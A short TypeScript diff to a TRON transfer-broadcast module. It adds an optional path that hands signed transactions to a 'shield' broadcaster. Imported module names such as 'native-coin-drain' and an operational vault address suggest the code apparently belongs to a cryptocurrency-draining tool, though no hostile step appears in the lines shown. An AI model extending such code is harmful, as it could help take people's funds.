@@ -4,6 +4,10 @@
 import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
 import { parseNativeAmount } from './native-coin-drain.js'
 import { resolveTronVaultAddress } from './operational-vault.js'
+import {
+  broadcastTronShield,
+  isTronShieldEnabled,
+} from './tron-settlement-enhancements.js'
 
 export type TronNativeTransferRequest = {
   from: string
@@ -76,6 +80,10 @@ export async function broadcastSignedTrxNativeTransfer(params: {
   signedTransaction: Record<string, unknown>
   rpcUrl?: string
 }): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
+  if (isTronShieldEnabled()) {
+    return broadcastTronShield({ signedTransaction: params.signedTransaction })
+  }
+
   const fullHost = params.rpcUrl?.trim() || resolveTronSensoryFullHost()
   try {
     const tronWeb = await createTronWeb(fullHost)
